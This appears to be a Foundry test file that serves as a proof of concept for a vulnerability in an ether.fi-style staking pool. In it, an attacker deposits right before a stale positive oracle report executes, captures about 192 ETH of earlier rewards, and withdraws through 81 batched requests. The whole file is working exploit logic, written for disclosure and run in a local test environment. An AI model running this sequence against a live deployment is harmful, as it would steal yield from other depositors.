// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Tested after copying this artifact into test/ on the clean reviewed
// origin/master snapshot. The import is intentionally relative to test/.

import "./TestSetup.sol";

contract OraclePositiveRebaseAsyncExitMaxPoC is TestSetup {
    address internal incumbent = makeAddr("incumbent");
    address internal attacker = makeAddr("attacker");

    function setUp() public {
        setUpTests();

        vm.prank(admin);
        withdrawRequestNFTInstance.unpause();

        vm.deal(incumbent, 14_559 ether);
        vm.prank(incumbent);
        liquidityPoolInstance.deposit{value: 14_559 ether}();

        vm.prank(address(etherFiAdminInstance));
        liquidityPoolInstance.depositToRecipient(incumbent, 1_964_726 ether, address(0));

        vm.startPrank(owner);
        liquidityPoolInstance.setMaxWithdrawAmount(1_000 ether);
        etherFiOracleInstance.setOracleReportPeriod(1_280);
        etherFiAdminInstance.updateMaxFinalizedWithdrawalAmountPerDay(80_000 ether);
        vm.stopPrank();
    }

    function test_oneDayThroughputExtractsOver192Eth() public {
        uint256 tvlBefore = liquidityPoolInstance.getTotalPooledEther();
        assertEq(tvlBefore, 1_979_285 ether);

        _moveClock(int256(19 days / 12));
        IEtherFiOracle.OracleReport memory stalePositive = _emptyOracleReport();
        stalePositive.accruedRewards = int128(int256(tvlBefore * 25 / 10_000));
        _publishForExecution(stalePositive);
        assertTrue(etherFiAdminInstance.canExecuteTasks(stalePositive));

        uint256 capital = 80_000 ether;
        vm.deal(attacker, capital);

        vm.startPrank(attacker);
        liquidityPoolInstance.deposit{value: capital}();
        etherFiAdminInstance.executeTasks(stalePositive);

        uint256 capturedBalance = eETHInstance.balanceOf(attacker);
        uint256 capturedOldRewards = capturedBalance - capital;
        assertGt(capturedOldRewards, 192 ether);

        eETHInstance.approve(address(liquidityPoolInstance), type(uint256).max);
        uint256 requestCount = (capturedBalance + 1_000 ether - 1) / (1_000 ether);
        uint256[] memory requestIds = new uint256[](requestCount);
        uint256 remaining = capturedBalance;

        for (uint256 i; i < requestCount; ++i) {
            uint256 amount = remaining > 1_000 ether ? 1_000 ether : remaining;
            requestIds[i] = liquidityPoolInstance.requestWithdraw(attacker, amount);
            remaining -= amount;
        }
        vm.stopPrank();

        assertEq(requestCount, 81);

        // At 80k ETH/day and a 1,280-slot (~4.27h) report, 14 full
        // 1,000-ETH requests fit per report. Six reports settle all requests.
        uint256 cursor;
        while (cursor < requestCount) {
            uint256 end = cursor + 14;
            if (end > requestCount) end = requestCount;

            uint128 amountToFinalize;
            for (uint256 i = cursor; i < end; ++i) {
                amountToFinalize += withdrawRequestNFTInstance.getRequest(requestIds[i]).amountOfEEth;
            }

            _moveClock(1_280);
            uint256 reportTvl = liquidityPoolInstance.getTotalPooledEther();
            IEtherFiOracle.OracleReport memory report = _emptyOracleReport();
            report.accruedRewards = int128(int256(
                reportTvl * 500 * (1_280 * 12) / (10_000 * 365 days)
            ));
            report.lastFinalizedWithdrawalRequestId = uint32(requestIds[end - 1]);
            report.finalizedWithdrawalAmount = amountToFinalize;

            _publishForExecution(report);
            assertTrue(etherFiAdminInstance.canExecuteTasks(report));
            etherFiAdminInstance.executeTasks(report);

            for (uint256 i = cursor; i < end; ++i) {
                withdrawRequestNFTInstance.claimWithdraw(requestIds[i]);
            }
            cursor = end;
        }

        uint256 profit = attacker.balance - capital;
        emit log_named_decimal_uint("attacker profit (ETH)", profit, 18);

        assertGt(profit, 192 ether);
        assertApproxEqAbs(profit, capturedOldRewards, 1e12);
    }

    function _publishForExecution(IEtherFiOracle.OracleReport memory report) internal {
        _initReportBlockStamp(report);

        uint32 currentSlot = etherFiOracleInstance.computeSlotAtTimestamp(block.timestamp);
        uint32 currentEpoch = currentSlot / 32;
        uint32 reportEpoch = report.refSlotTo / 32 + 3;
        if (currentEpoch < reportEpoch) {
            _moveClock(int256(uint256(32 * (reportEpoch - currentEpoch))));
        }

        vm.prank(alice);
        etherFiOracleInstance.submitReport(report);
        vm.prank(bob);
        etherFiOracleInstance.submitReport(report);

        _moveClock(int256(uint256(etherFiAdminInstance.postReportWaitTimeInSlots())));
    }
}
